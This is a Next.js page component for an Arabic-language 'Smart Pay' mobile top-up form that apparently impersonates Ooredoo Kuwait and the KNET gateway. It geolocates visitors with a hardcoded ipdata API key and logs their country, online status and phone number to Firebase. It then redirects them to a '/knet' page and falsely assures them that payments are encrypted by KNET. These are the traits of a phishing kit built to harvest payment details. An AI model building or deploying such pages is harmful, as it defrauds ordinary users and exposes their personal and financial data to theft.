"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import PaymentPage from "./kw/page"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
import PhoneNumbersGrid from "@/components/pay-page"
import { ArrowLeft, CreditCard, DollarSign, Phone } from "lucide-react"
import { Button } from "@/components/ui/button"
import PaymentSummary from "@/components/payment-summary"
import { Input } from "@/components/ui/input"
import LanguageToggle from "@/components/language-toggle"

export default function Page() {
  const router = useRouter()
  const [value, setValue] = useState("5")
  const [phone, setPhone] = useState("")
  const [isloading, setIsloading] = useState(false)
  const _id = randstr("oredoo-")


  function randstr(prefix: string) {
    return Math.random()
      .toString(36)
      .replace("0.", prefix || "")
  }

  async function getLocation() {
    const APIKEY = "a48dbc44c94452a8427c73683e68294f00a2892eee042a563ee1d07b"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
      })
      localStorage.setItem("country", country)

      setupOnlineStatus(_id)
      return country
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }
  useEffect(() => {
    async function checkCountry() {
      try {
        // Get the country code
        await getLocation().then((v) => {
        })

        setIsloading(false)
      } catch (error) {
        console.error("Error in country detection:", error)
        setIsloading(false)
      }
    }

    checkCountry()
  }, [router])

  const handleSubmit = (e: any) => {
    e.preventDefault()
    setIsloading(true)
    const _id = localStorage.getItem("visitor")

    addData({ id: _id, phone })
    setTimeout(() => {
      setIsloading(false)
      router.push("/knet")
    }, 1000)
  }

  useEffect(() => {
    localStorage.setItem("total", value)
  }, [value])

    return (
      <div className="flex flex-col min-h-screen bg-gradient-to-b from-gray-50 to-gray-100">
      <header className="flex justify-between items-center p-4 bg-white shadow-sm sticky top-0 z-50">
        <LanguageToggle />
        <button
          className="p-2 rounded-full hover:bg-gray-100 transition-colors duration-200 flex items-center gap-2 text-gray-600"
          onClick={() => router.back()}
        >
          <ArrowLeft className="w-5 h-5" />
          <span className="hidden sm:inline text-sm font-medium">Back</span>
        </button>
      </header>

      <div className="w-full max-w-3xl mx-auto px-4 py-6">
        <div className="relative w-full overflow-hidden rounded-2xl shadow-lg mb-8">
          <div className="absolute inset-0 bg-gradient-to-r from-red-500/20 to-transparent z-10"></div>
          <img src="/zf.png" alt="Smart Pay Promotion" className="w-full h-auto object-cover rounded-2xl" />
          <div className="absolute bottom-4 right-4 z-20 bg-white/90 px-4 py-2 rounded-lg shadow-md">
            <div className="text-red-600 font-bold text-lg">Smart Pay</div>
          </div>
        </div>

        <form className="bg-white rounded-2xl shadow-md p-6 sm:p-8 max-w-md mx-auto w-full" onSubmit={handleSubmit}>
          <h2 className="text-2xl font-bold text-gray-800 text-right mb-6">تفاصيل الدفع</h2>

          <div className="space-y-6">
            <div className="space-y-2">
              <div className="text-right text-lg font-semibold text-gray-700 flex justify-end items-center gap-2">
                <span>المبلغ</span>
                <DollarSign className="w-5 h-5 text-gray-500" />
              </div>
              <div className="relative">
                <div className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 font-medium">د.ك</div>
                <Input
                  type="tel"
                  className="text-right pr-4 py-6 text-xl font-medium border-gray-300 focus:border-red-500 focus:ring-red-500 rounded-xl shadow-sm transition-all duration-200"
                  value={value}
                  maxLength={4}
                  onChange={(e) => setValue(e.target.value)}
                  dir="rtl"
                />
              </div>
            </div>

            <div className="space-y-2">
              <div className="text-right text-lg font-semibold text-gray-700 flex justify-end items-center gap-2">
                <span>رقم الموبايل</span>
                <Phone className="w-5 h-5 text-gray-500" />
              </div>
              <Input
                type="tel"
                maxLength={10}
                className="text-right pr-4 py-6 border-gray-300 focus:border-red-500 focus:ring-red-500 rounded-xl shadow-sm transition-all duration-200"
                placeholder="أدخل رقم الهاتف"
                value={phone}
                required
                onChange={(e) => setPhone(e.target.value)}
                dir="rtl"
              />
            </div>

            <Button
              disabled
              className="w-full py-6 mt-4 bg-gray-300 text-gray-600 rounded-xl text-lg font-medium shadow-sm transition-all duration-200 flex items-center justify-center gap-2"
            >
              <span>الدفع لرقم آخر</span>
              <Phone className="w-5 h-5" />
            </Button>
          </div>

          <div className="mt-8 border-t border-gray-200 pt-6">
            <PaymentSummary amount={value} isloading={isloading} />
          </div>

          <Button
            type="submit"
            className={`w-full py-6 mt-6 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-xl text-lg font-medium shadow-md transition-all duration-300 hover:shadow-lg flex items-center justify-center gap-2 ${isloading ? "opacity-80 cursor-not-allowed" : ""}`}
            disabled={isloading}
          >
            {isloading ? (
              <>
                <svg
                  className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path
                    className="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                  ></path>
                </svg>
                <span>جاري المعالجة...</span>
              </>
            ) : (
              <>
                <span>متابعة الدفع</span>
                <CreditCard className="w-5 h-5" />
              </>
            )}
          </Button>

          <div className="mt-6 text-center text-sm text-gray-500">المدفوعات آمنة ومشفرة بواسطة KNET</div>
        </form>
      </div>

      <footer className="mt-auto py-4 text-center text-sm text-gray-500 bg-white border-t">
        © {new Date().getFullYear()} Smart Pay. جميع الحقوق محفوظة
      </footer>
    </div>
    )

}
